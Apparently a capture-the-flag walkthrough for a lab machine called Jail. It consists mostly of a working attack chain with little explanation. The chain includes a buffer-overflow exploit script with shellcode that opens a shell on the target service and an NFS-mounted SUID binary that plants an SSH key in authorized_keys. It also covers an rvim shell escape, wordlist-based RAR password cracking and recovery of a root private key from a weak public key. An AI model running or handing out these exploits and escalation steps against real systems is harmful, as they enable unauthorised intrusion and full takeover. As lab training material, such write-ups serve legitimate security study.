##### Enumerate web directories
```
http://10.10.10.34/jailuser/dev/
```

##### GDB
```
[----------------------------------registers-----------------------------------]
EAX: 0xfffffe00 
EBX: 0x5 
ECX: 0xffaa8004 --> 0x3 
EDX: 0x0 
ESI: 0x0 
EDI: 0xf772e000 --> 0x1b2db0 
EBP: 0xffaa8188 --> 0x0 
ESP: 0xffaa7ff0 --> 0xffaa8188 --> 0x0 
EIP: 0xf7759dc9 (<__kernel_vsyscall+9>:	pop    ebp)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7759dc3 <__kernel_vsyscall+3>:	mov    ebp,ecx
   0xf7759dc5 <__kernel_vsyscall+5>:	syscall 
   0xf7759dc7 <__kernel_vsyscall+7>:	int    0x80
=> 0xf7759dc9 <__kernel_vsyscall+9>:	pop    ebp
   0xf7759dca <__kernel_vsyscall+10>:	pop    edx
   0xf7759dcb <__kernel_vsyscall+11>:	pop    ecx
   0xf7759dcc <__kernel_vsyscall+12>:	ret    
   0xf7759dcd:	nop
[------------------------------------stack-------------------------------------]
0000| 0xffaa7ff0 --> 0xffaa8188 --> 0x0 
0004| 0xffaa7ff4 --> 0x0 
0008| 0xffaa7ff8 --> 0xffaa8004 --> 0x3 
0012| 0xffaa7ffc --> 0xf76639b9 (<accept+57>:	cmp    eax,0xfffff000)
0016| 0xffaa8000 --> 0xffaa8188 --> 0x0 
0020| 0xffaa8004 --> 0x3 
0024| 0xffaa8008 --> 0xffaa804c --> 0xeca50002 
0028| 0xffaa800c --> 0xffaa816c --> 0x10 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0xf7759dc9 in __kernel_vsyscall ()
```

##### jail.c
```
char buffer[1024];
char strchr[2] = "\n\x00";
token = strtok(buffer, strchr); // split by delimeters
if (strncmp ("USER admin","USER ", 5) == 0) { // if string is "USER ", "PASS ", "DEBUG"
        if (strncmp(buffer, "OPEN", 4) == 0) {
            printf("OK Jail doors opened.");
            fflush(stdout);
        } else if (strncmp(buffer, "CLOSE", 5) == 0) {
            printf("OK Jail doors closed.");
            fflush(stdout);
        }
}
```

##### stdout
```
OK Ready. Send USER command.
DEBUG
OK DEBUG mode on.
USER admin
OK Send PASS command.
PASS 1974jailbreak!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Debug: userpass buffer @ 0xffffd640
```

##### Reverse Shell
```python
#!/usr/bin/python
# https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/
import struct, socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
jump = struct.pack('<L',  0xffffd610 + 0x30)
shell = "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
payload = "\x90" * 28 + jump + "\x90" * 20 + shell
try:
	s.connect(('10.10.10.34', 7411))
	s.send("USER admin")
	print s.recv(1024)
	s.send("PASS {}".format(payload))
	print s.recv(1024)
	while(1):
		s.send(raw_input("shell> ") + "\n\x00")
		time.sleep(1)
		print s.recv(10000)
except:
	s.close()
```

##### mount nfs
```
useradd frank
sudo mkdir /mnt/remotenfs
10.10.10.34:/var/nfsshare /mnt/remotenfs nfs rw,async,hard,intr 0 0
mount /mnt/remotenfs
```

##### create suid binary
```
int main(void)
{
    setresuid(geteuid(), geteuid(), geteuid());
    system("echo 'ssh-rsa KEY' > /home/frank/.ssh/authorized_keys");
}
```

##### Enumerate frank
```
[frank@localhost tmp]$ sudo -l
User frank may run the following commands on this host:
    (frank) NOPASSWD: /opt/logreader/logreader.sh
    (adm) NOPASSWD: /usr/bin/rvim /var/www/html/jailuser/dev/jail.c


[frank@localhost tmp]$ sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
:python import pty;pty.spawn("/bin/bash")
```

##### Enumerate adm
```
Note from Administrator:
Frank, for the last time, your password for anything encrypted must be your last name followed by a 4 digit number and a symbol.

> Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!
> https://www.guballa.de/substitution-solver
Hahaha! Nobody will quess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!
```

##### Generate wordlist and crack rar
```
crunch 11 11 -t Morris%%%%^ > wordlist
ghost@intheshell:~/Downloads/jail$ ./crackrar.sh keys.rar wordlist 

> trying "Morris1962!" 
> Archive password is: "Morris1962!"

Attributes      Size     Date    Time   Name
----------- ---------  ---------- -----  ----
*-rw-r--r--       451  2017-07-03 12:34  rootauthorizedsshkey.pub
----------- ---------  ---------- -----  ----
                  451                    1
```

##### Generate the private key to login to SSH as root
```
ghost@intheshell:~/git/RsaCtfTool$ ./RsaCtfTool.py --publickey ~/Downloads/jail/rootauthorizedsshkey.pub --private
```
